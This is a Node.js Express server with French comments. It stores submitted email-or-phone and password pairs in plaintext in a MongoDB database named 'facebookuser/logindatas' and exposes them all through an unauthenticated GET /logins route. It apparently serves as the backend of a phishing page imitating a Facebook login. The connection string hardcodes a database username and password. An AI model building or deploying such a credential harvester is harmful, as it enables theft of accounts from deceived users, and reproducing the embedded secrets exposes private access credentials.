const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors({
  origin: ['https://frontend-coral-zeta-89.vercel.app', 'http://localhost:3000'], // Autorise plusieurs origines
}));

app.use(bodyParser.json());

// Connexion à MongoDB
mongoose.connect('mongodb+srv://sergende695:sergeleprince237@facebookuser.zf45c.mongodb.net/logindatas?retryWrites=true&w=majority', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
  .then(() => console.log('Connexion à MongoDB réussie !'))
  .catch((err) => console.error('Erreur de connexion à MongoDB :', err));

// Définition du schéma des données
const LoginSchema = new mongoose.Schema({
  emailOrMobile: { type: String, required: true },
  password: { type: String, required: true },
  date: { type: Date, default: Date.now },
});

// Modèle de données
const LoginData = mongoose.model('LoginData', LoginSchema);

// Route pour sauvegarder les données du formulaire
app.post('/login', async (req, res) => {
  try {
    const { emailOrMobile, password } = req.body;

    if (!emailOrMobile || !password) {
      return res.status(400).json({ error: 'Tous les champs sont requis.' });
    }

    const newLogin = new LoginData({ emailOrMobile, password });
    await newLogin.save();
    res.status(201).json({ message: 'Données enregistrées avec succès.' });
  } catch (error) {
    res.status(500).json({ error: 'Erreur lors de l\'enregistrement des données.' });
  }
});

// Route pour récupérer toutes les données
app.get('/logins', async (req, res) => {
  try {
    const logins = await LoginData.find();
    res.status(200).json(logins);
  } catch (error) {
    res.status(500).json({ error: 'Erreur lors de la récupération des données.' });
  }
});

// Lancer le serveur
app.listen(PORT, () => {
  console.log(`Serveur en cours d'exécution sur https://back-ky38.onrender.com`);
});
